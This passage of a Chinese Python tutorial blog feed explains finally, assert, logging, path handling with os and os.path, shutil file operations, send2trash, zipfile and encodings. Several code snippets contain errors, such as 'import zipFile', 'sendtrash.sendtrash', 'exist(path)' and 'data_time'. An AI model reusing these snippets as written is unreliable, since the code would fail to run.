title="finally"></a>finally</h2><p>Python的关键词finally功能是和try配合使用，在try之后可以有except或else，这个finally关键词必须放在except和else之后，同时不论是否有异常发生一定会执行这个finally内的程序代码。这个功能主要是用在Python程序与数据库连接时，输出连接相关信息。</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006170032835.png" alt="image-20201006170032835"></p><h2 id="程序断言assert"><a href="#程序断言assert" class="headerlink" title="程序断言assert"></a>程序断言assert</h2><p>Python的assert关键词主要功能是协助在程序设计阶段，对整个程序的执行状态做一个全面性的安全检查，以确保程序不会发生语意上的错误。</p><p>断言(assert)主要功能是确保程序执行的某个阶段，必须符合一定的条件，如果不符合这个条件时程序主动抛出异常，让程序终止同时主动打印出异常原因，方便程序设计师侦错。它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert 条件，&#39;字符串&#39;</span><br></pre></td></tr></table></figure><p>程序执行至此阶段时测试条件，如果条件响应是True，程序不理会逗号“,”右边的字符串正常往下执行。如果条件响应是False，程序终止同时将逗号“,”右边的字符串输出到Traceback的字符串内。</p><p>停用断言assert，可以在Windows的命令提示环境，执行程序时使用“-O”选项停用断言。</p><h2 id="程序日志模块logging"><a href="#程序日志模块logging" class="headerlink" title="程序日志模块logging"></a>程序日志模块logging</h2><p>Python有程序日志logging功能，这个功能可以协助我们执行程序的除错，有了这个功能我们可以自行设定关键变量在每一个程序阶段的变化，由这个关键变量的变化可方便我们执行程序的除错。</p><h4 id="logging模块"><a href="#logging模块" class="headerlink" title="logging模块"></a>logging模块</h4><p>Python内有提供logging模块，这个模块有提供方法可以让我们使用程序日志logging功能，在使用前须先使用import导入此模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br></pre></td></tr></table></figure><h4 id="logging的等级"><a href="#logging的等级" class="headerlink" title="logging的等级"></a>logging的等级</h4><p>logging模块共分5个等级，从最低到最高等级顺序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DEBUG等级使用logging.debug( )显示程序日志内容，所显示的内容是程序的小细节，最低层级的内容，感觉程序有问题时可使用它追踪关键变量的变化过程。</span><br><span class="line"></span><br><span class="line">INFO等级使用logging.info( )显示程序日志内容，所显示的内容是记录程序一般发生的事件。</span><br><span class="line"></span><br><span class="line">WARNING等级使用logging.warning( )显示程序日志内容，所显示的内容虽然不会影响程序的执行，但是未来可能导致问题的发生。</span><br><span class="line"></span><br><span class="line">ERROR等级使用logging.error( )显示程序日志内容，通常显示程序在某些状态将引发错误的缘由。</span><br><span class="line"></span><br><span class="line">CRITICAL等级使用logging.critical( )显示程序日志内容，这是最重要的等级，通常是显示将让整个系统当掉或中断的错误。</span><br></pre></td></tr></table></figure><p>程序设计时，可以使用下列函数设定显示信息的等级：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(level&#x3D;logging.DEBUG)  #设定DEBUG等级</span><br></pre></td></tr></table></figure><p>当设定logging为某一等级时，未来只有此等级或更高等级的logging会被显示。</p><p>如显示所有等级的logging信息：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006170937172.png" alt="image-20201006170937172"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006171000146.png" alt="image-20201006171000146"></p><h4 id="格式化logging信息输出format"><a href="#格式化logging信息输出format" class="headerlink" title="格式化logging信息输出format"></a>格式化logging信息输出format</h4><p>可以使用在logging.basicConfig( )方法内增加format格式化输出信息为空字符串‘’的方式，取消显示前导输出信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(level&#x3D;logging.DEBUG,format&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure><h4 id="时间信息asctime"><a href="#时间信息asctime" class="headerlink" title="时间信息asctime"></a>时间信息asctime</h4><p>可以在format内配合asctime列出系统时间，这样可以列出每一重要阶段关键变量发生的时间。</p><p>如列出每一个logging输出时的时间</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181140290.png" alt="image-20201006181140290"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181205827.png" alt="image-20201006181205827"></p><p>要输出原先logging.xxx( )的输出信息，必须在format内增加message格式。</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181302448.png" alt="image-20201006181302448"></p><p>执行结果：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181323359.png" alt="image-20201006181323359"></p><h4 id="将程序日志logging输出到文件"><a href="#将程序日志logging输出到文件" class="headerlink" title="将程序日志logging输出到文件"></a>将程序日志logging输出到文件</h4><p>将logging输出在屏幕，其实不太方便逐一核对关键变量值的变化，此时可以考虑将logging输出到文件，方法是在logging.basicConfig( )增加filename=“文件名”，这样就可以将logging输出到指定的文件内。</p><p>如将程序日志输出到txt里：</p><p><img src="/2020/10/06/Python-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20201006181530241.png" alt="image-20201006181530241"></p><h4 id="停用程序日志logging"><a href="#停用程序日志logging" class="headerlink" title="停用程序日志logging"></a>停用程序日志logging</h4><p>可以使用下列方法停用日志logging：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.disable(level)  #level是停用logging的等级</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-文件读取与写入</title>
    <link href="http://yoursite.com/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/"/>
    <id>http://yoursite.com/2020/10/05/Python-文件读取与写入/</id>
    <published>2020-10-05T04:05:47.000Z</published>
    <updated>2020-10-06T08:33:43.862Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="文件路径"><a href="#文件路径" class="headerlink" title="文件路径"></a>文件路径</h2><p>文件路径图形如下：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201005121343034.png" alt="image-20201005121343034"></p><h4 id="绝对路径与相对路径"><a href="#绝对路径与相对路径" class="headerlink" title="绝对路径与相对路径"></a>绝对路径与相对路径</h4><p>在操作系统中可以使用2种方式表达文件路径。</p><p>1.绝对路径：路径从根目录开始表示，以上图为例，其绝对路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Python\ch14\ch14_1.py</span><br></pre></td></tr></table></figure><p>2.相对路径：指相对于当前工作目录的路径，若是当前工作目录是D:\Python\ch14，它的相对路径是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ch14_1.py</span><br></pre></td></tr></table></figure><p>另外，在操作系统处理文件夹的观念中会使用2个特殊符号“.”和“..”，“.”指的是当前文件夹，“..”指的是上一层文件夹。但是在使用上，当指当前文件夹时也可以省略“.\”。</p><h4 id="os模块与os-path模块"><a href="#os模块与os-path模块" class="headerlink" title="os模块与os.path模块"></a>os模块与os.path模块</h4><p>在Python内有关文件路径的模块是os。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import os #导入os模块</span><br></pre></td></tr></table></figure><p>在os模块内有另一个常用模块os.path，由于os.path是在os模块内，所以导入os模块后不用再导入os.path模块。</p><h4 id="取得当前工作目录"><a href="#取得当前工作目录" class="headerlink" title="取得当前工作目录"></a>取得当前工作目录</h4><p>os模块内的getcwd( )可以取得当前工作目录。</p><p>如列出当前工作目录：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145223242.png" alt="image-20201006145223242"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145254888.png" alt="image-20201006145254888"></p><h4 id="取得绝对路径"><a href="#取得绝对路径" class="headerlink" title="取得绝对路径"></a>取得绝对路径</h4><p>os.path模块的abspath(path)会传回path的绝对路径，通常我们可以使用这个方法将文件或文件夹的相对路径转成绝对路径。</p><p>如取得绝对路径的应用：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145432196.png" alt="image-20201006145432196"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145456563.png" alt="image-20201006145456563"></p><h4 id="传回特定路段的相对路径"><a href="#传回特定路段的相对路径" class="headerlink" title="传回特定路段的相对路径"></a>传回特定路段的相对路径</h4><p>os.path模块的relpath(path, start)会传回从start到path的相对路径，如果省略start，则传回当前工作目录至path的相对路径。</p><p>如传回相对路径的应用：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145653302.png" alt="image-20201006145653302"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006145831779.png" alt="image-20201006145831779"></p><h4 id="检查路径的方法exist-isabs-isdir-isfile"><a href="#检查路径的方法exist-isabs-isdir-isfile" class="headerlink" title="检查路径的方法exist/isabs/isdir/isfile"></a>检查路径的方法exist/isabs/isdir/isfile</h4><p>下列是常用的os.path模块方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exist(path)：如果path的文件或文件夹存在传回True，否则传回False。</span><br><span class="line"></span><br><span class="line">isabs(path)：如果path的文件或文件夹是绝对路径传回True，否则传回False。</span><br><span class="line"></span><br><span class="line">isdir(path)：如果path是文件夹传回True，否则传回False。</span><br><span class="line"></span><br><span class="line">isfile(path)：如果path是文件传回True，否则传回False。</span><br></pre></td></tr></table></figure><h4 id="文件与目录的操作mkdir-rmdir-remove-chdir"><a href="#文件与目录的操作mkdir-rmdir-remove-chdir" class="headerlink" title="文件与目录的操作mkdir/rmdir/remove/chdir"></a>文件与目录的操作mkdir/rmdir/remove/chdir</h4><p>这几个方法是在os模块内，执行下列操作前先用os.path.exists( )检查是否存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(path)：建立path目录。</span><br><span class="line"></span><br><span class="line">rmdir(path)：删除path目录，限制只能是空的目录。</span><br><span class="line"></span><br><span class="line">remove(path)：删除path文件。</span><br><span class="line"></span><br><span class="line">chdir(path)：将当前工作文件夹改至path。</span><br></pre></td></tr></table></figure><h4 id="传回文件路径os-path-join"><a href="#传回文件路径os-path-join" class="headerlink" title="传回文件路径os.path.join( )"></a>传回文件路径os.path.join( )</h4><p>这个方法可以将os.path.join( )参数内的字符串结合为一个文件路径，参数可以有2个到多个。</p><p>如使用for循环将一个列表内的文件与一个路径结合：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006150938010.png" alt="image-20201006150938010"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151000741.png" alt="image-20201006151000741"></p><h4 id="获得特定文件的大小"><a href="#获得特定文件的大小" class="headerlink" title="获得特定文件的大小"></a>获得特定文件的大小</h4><p>os.path.getsize( )方法可以获得特定文件的大小。</p><p>如获得某个文件的文件大小：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151159257.png" alt="image-20201006151159257"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151218139.png" alt="image-20201006151218139"></p><h4 id="获得特定工作目录的内容"><a href="#获得特定工作目录的内容" class="headerlink" title="获得特定工作目录的内容"></a>获得特定工作目录的内容</h4><p>os.listdir()方法将以列表方式列出特定工作目录的内容。</p><p>如列出特定工作目录所有文件的大小：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151349241.png" alt="image-20201006151349241"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151414535.png" alt="image-20201006151414535"></p><h4 id="获得特定工作目录内容glob"><a href="#获得特定工作目录内容glob" class="headerlink" title="获得特定工作目录内容glob"></a>获得特定工作目录内容glob</h4><p>Python内还有一个模块可用于列出特定工作目录内容glob，当导入这个模块后可以使用glob方法获得特定工作目录的内容，这个方法最大特色是可以使用通配符“<em>”，例如，可用“</em>.txt”获得所有txt扩展名的文件。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151603715.png" alt="image-20201006151603715"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006151629769.png" alt="image-20201006151629769"></p><h4 id="遍历目录树os-walk"><a href="#遍历目录树os-walk" class="headerlink" title="遍历目录树os.walk( )"></a>遍历目录树os.walk( )</h4><p>在os模块内有提供一个os.walk( )方法可以让我们遍历目录树，这个方法每次执行循环时将传回3个值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当前工作目录名称(dirName)。</span><br><span class="line"></span><br><span class="line">当前工作目录底下的子目录列表(sub_dirNames).</span><br><span class="line"></span><br><span class="line">当前工作目录底下的文件列表(fileNames)。</span><br></pre></td></tr></table></figure><p>语法格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for dirname,sub_dirNames,fileNames in os.walk(&quot;目录路径&quot;)：</span><br><span class="line">                  程序区块</span><br></pre></td></tr></table></figure><p>上述dirName, sub_dirNames, fileNames名称可以自行命名，顺序则不可以更改，至于目录路径可以使用绝对地址或相对地址，如果不注明则代表当前工作目录的子目录。</p><p>如此目录内容如下:</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006152102778.png" alt="image-20201006152102778"></p><p>遍历此oswalk目录，同时列出内容:</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006152200228.png" alt="image-20201006152200228"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006152229395.png" alt="image-20201006152229395"></p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>Python处理读取或写入文件首先需将文件打开，然后可以一次读取所有文件内容或是一行一行读取文件内容。Python可以使用open( )函数打开文件，文件打开后会传回文件对象。</p><h4 id="读取整个文件read"><a href="#读取整个文件read" class="headerlink" title="读取整个文件read()"></a>读取整个文件read()</h4><p>文件打开后，可以使用read( )读取所打开的文件，使用read( )读取时，所有的文件内容将以一个字符串方式被读取然后存入字符串变量内，只要打印此字符串变量相当于可以打印整个文件内容。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006154553632.png" alt="image-20201006154553632"></p><h4 id="with关键词"><a href="#with关键词" class="headerlink" title="with关键词"></a>with关键词</h4><p>Python提供一个关键词with应用在打开文件与建立文件对象时，使用方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(打开的文件) as 文件对象：</span><br><span class="line">     相关操作</span><br></pre></td></tr></table></figure><p>使用这种方式打开文件，最大特色是可以不必在程序中关闭文件，with指令会在结束不需要此文件时自动将它关闭，文件经“with open( ) as文件对象”打开后会有一个文件对象，就可以使用read( )读取此文件对象的内容。</p><h4 id="逐行读取文件内容"><a href="#逐行读取文件内容" class="headerlink" title="逐行读取文件内容"></a>逐行读取文件内容</h4><p>Python逐行读取文件内容，可以使用下列循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for line in file_obj:  #line和obj取名任意，file_obj是文件对象</span><br><span class="line">     循环相关指令</span><br></pre></td></tr></table></figure><h4 id="逐行读取使用readlines"><a href="#逐行读取使用readlines" class="headerlink" title="逐行读取使用readlines( )"></a>逐行读取使用readlines( )</h4><p>使用with关键词配合open( )时，所打开的文件对象当前只在with区块内使用，特别是想要遍历此文件对象时。Python另外有一个方法readlines( )可以逐行读取，同时以列表方式储存，另一个特色是读取时每行的换行字符皆会储存在列表内。</p><p>如使用readlines( )逐行读取txt：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006155704715.png" alt="image-20201006155704715"></p><h4 id="字符串的替换"><a href="#字符串的替换" class="headerlink" title="字符串的替换"></a>字符串的替换</h4><p>使用Word处理时常常会使用寻找/取代功能，Python也有这个方法可以使新字符串取代旧字符串。</p><p>字符串对象.replace(旧字符串, 新字符串) # 在字符串对象内，新字符串将取代旧字符串。</p><p>如将“工专”改为“科大”：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006155837575.png" alt="image-20201006155837575"></p><h4 id="数据搜寻使用find"><a href="#数据搜寻使用find" class="headerlink" title="数据搜寻使用find( )"></a>数据搜寻使用find( )</h4><p>对于字符串的使用，Python提供一个方法find( )，这个方法除了可以执行数据搜寻以外，如果搜寻到数据还会传回数据的索引位置，如果没有找到则传回-1。使用语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index &#x3D; S.find(sub,[start,end])</span><br></pre></td></tr></table></figure><p>S代表被搜寻的字符串，sub是欲搜寻的字符串，index是如果搜寻到时传回的索引值，start和end代表可以被搜寻字符串的区间，若是省略表示全部搜寻，如果没有找到则传回-1给index。</p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><h4 id="将结果写入空文件内"><a href="#将结果写入空文件内" class="headerlink" title="将结果写入空文件内"></a>将结果写入空文件内</h4><p>打开文件open( )函数使用时默认是mode=‘r’读取文件模式，因此如果打开文件是供读取可以省略mode=‘r’。若是要供写入，那么就要设定写入模式mode=‘w’，程序设计时可以省略mode，直接在open( )函数内输入‘w’。如果所打开的文件需要读取和写入可以使用‘r+’。如果所打开的文件不存在open( )会建立该文件对象，如果所打开的文件已经存在，原文件内容将被清空。</p><p>输出到文件可以使用write( )方法，语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件对象.write(欲输出数据)  #可将数据输出到文件对象</span><br></pre></td></tr></table></figure><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006160430673.png" alt="image-20201006160430673"></p><h4 id="写入数值资料"><a href="#写入数值资料" class="headerlink" title="写入数值资料"></a>写入数值资料</h4><p>write( )输出时无法输出数值数据，如果想要使用write( )将数值数据输出，必须使用str( )将数值数据转成字符串数据。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006160556264.png" alt="image-20201006160556264"></p><h4 id="附加写入"><a href="#附加写入" class="headerlink" title="附加写入"></a>附加写入</h4><p>附加文件主要是可以将文件输出到所打开的文件末端，当以open( )打开时，需增加参数mode=‘a’或是用‘a’，其实a是append的缩写。用open( )打开文件使用‘a’参数时，如果所打开的文件不存在，Python会打开文件供写入；如果所打开的文件存在，Python在执行写入时不会清空原先的文件内容。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006160717650.png" alt="image-20201006160717650"></p><h4 id="shutil模块"><a href="#shutil模块" class="headerlink" title="shutil模块"></a>shutil模块</h4><p>这个模块有提供一些方法可以让我们在Python程序内执行文件或目录的复制、删除、更改位置和更改名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br></pre></td></tr></table></figure><p>1.文件拷贝copy()</p><p>在shutil模块可以使用copy( )执行文件的复制，语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copy(源位置，目的位置)</span><br></pre></td></tr></table></figure><p>执行前source文件一定要存在否则会产生错误。</p><p>2.目录的复制copytree()</p><p>copytree( )的语法格式与copy( )相同，只不过这是复制目录，复制时目录底下的子目录或文件也将被复制，此外，执行前目录一定要存在否则会产生错误。</p><p>3.文件的移动move()</p><p>在shutil模块可以使用move( )执行文件的移动，语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.move(源文件位置，目的文件位置)</span><br></pre></td></tr></table></figure><p>可将source文件移动到destination目的位置，执行前source文件一定要存在否则会产生错误，执行后source文件将不再存在。</p><p>4.文件名的更改move()</p><p>在移动过程如果目的路径含有文件名，则可以达到更改名称的效果。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161246384.png" alt="image-20201006161246384"></p><p>5.目录的移动move()</p><p>move( )也可以执行目录的移动，在移动时子目录也将随着移动。</p><p>如将当前工作目录的子目录dir37移至D:\Python目录下。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161409265.png" alt="image-20201006161409265"></p><p>6.目录更改名称move()</p><p>如果在移动过程目的的目录不存在，此时就可以达到目录更改名称的目的了，甚至路径名称也可能更改。</p><p>如将当前子目录dir38移动并改名为out38：</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161539283.png" alt="image-20201006161539283"></p><p>7.删除有数据的目录rmtree( )</p><p>os模块的rmdir( )只能删除空的目录，如果要删除含数据文件的目录须使用rmtree( )。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006161656882.png" alt="image-20201006161656882"></p><h4 id="第三方模块删除send2trash"><a href="#第三方模块删除send2trash" class="headerlink" title="第三方模块删除send2trash( )"></a>第三方模块删除send2trash( )</h4><p>Python内置的shutil模块在删除文件后就无法复原了，当前有一个第三方的模块send2trash，执行删除文件或文件夹后是将被删除的文件放在回收站，如果后悔可以救回。不过在使用此模块前须先下载这个外部模块。可以进入安装Python的文件夹，然后在DOS环境安装此模块，安装指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install send2trash</span><br></pre></td></tr></table></figure><p>安装完成后就可以使用下列方式删除文件或目录了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import send2trash</span><br><span class="line">sendtrash.sendtrash(文件或文件夹)</span><br></pre></td></tr></table></figure><h2 id="文件压缩与解压缩zipFile"><a href="#文件压缩与解压缩zipFile" class="headerlink" title="文件压缩与解压缩zipFile"></a>文件压缩与解压缩zipFile</h2><p>Windows操作系统有提供功能将一般文件或目录压缩，压缩后的扩展名是zip，Python内有zipFile模块也可以将文件或目录压缩以及解压缩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import zipFile</span><br></pre></td></tr></table></figure><h4 id="文件或目录的压缩"><a href="#文件或目录的压缩" class="headerlink" title="文件或目录的压缩"></a>文件或目录的压缩</h4><p>执行文件压缩前首先要使用ZipFile( )方法建立一份压缩后的档名，在这个方法中另外要加上‘w’参数，注明未来是供write( )方法写入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filezip &#x3D; zipfile.ZipFile(&#39;out.zip&#39;,&#39;w&#39;) #outzip是存储压缩的结果</span><br></pre></td></tr></table></figure><p>fileZip和out.zip皆可以自由设定名称，fileZip是压缩文件对象代表的是out.zip，未来将被压缩的文件数据写入此对象，就可以将结果存入out.zip。虽然ZipFile( )无法执行整个目录的压缩，不过可用循环方式将目录底下的文件压缩，即可达到压缩整个目录的目的。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006162303119.png" alt="image-20201006162303119"></p><h4 id="读取zip文件"><a href="#读取zip文件" class="headerlink" title="读取zip文件"></a>读取zip文件</h4><p>ZipFile对象有namelist( )方法可以传回zip文件内所有被压缩的文件或目录名称，同时以列表方式传回此对象。这个传回的对象可以使用infolist( )方法传回各元素的属性，如文件名filename、文件大小file_size、压缩结果大小compress_size、文件时间data_time。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006162448350.png" alt="image-20201006162448350"></p><h4 id="解压缩zip文件"><a href="#解压缩zip文件" class="headerlink" title="解压缩zip文件"></a>解压缩zip文件</h4><p>解压缩zip文件可以使用extractall( )方法。</p><p><img src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006162535954.png" alt="image-20201006162535954"></p><h2 id="认识编码格式encode"><a href="#认识编码格式encode" class="headerlink" title="认识编码格式encode"></a>认识编码格式encode</h2><p>当前为止所谈到的文本文件(.txt)的文件打开有关文件编码部分皆是使用Windows操作系统默认方式，文本模式下常用的编码方式有utf-8和cp950。使用open( )打开文件时，可以增加另一个常用的参数encoding，整个open( )的语法将如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_obj &#x3D; open(file,mode&#x3D;&#39;r&#39;,encoding&#x3D;&quot;utf-8&quot;)</span><br></pre></td></tr></table></figure><h4 id="记事本默认的编码"><a href="#记事本默认的编码" class="headerlink" title="记事本默认的编码"></a>记事本默认的编码</h4><p>中文Windows操作系统记事本默认的编码是ANSI，在这个编码格式下，在Python的open( )内我们可以使用预设的encoding=“cp950”编码，因为这是Python预设所以我们可以省略此参数。</p><h4 id="utf-8编码"><a href="#utf-8编码" class="headerlink" title="utf-8编码"></a>utf-8编码</h4><p>utf-8英文全名是8-bit Unicode Transformation Format，这是一种适合多语系的编码规则，主要方法是使用可变长度字节方式储存字符，以节省内存空间。</p><p>这种编码规则已经包含了全球所有语言的字符了，所以采用这种编码方式设计网页时，其他国家的浏览器只要支持utf-8编码皆可显示。</p><p>utf-8是国际通用的编码，如果你使用Linux或Max OS，一般也是用国际编码，所以如果打开文件发生错误，请先检查文件的编码格式。</p><p><img 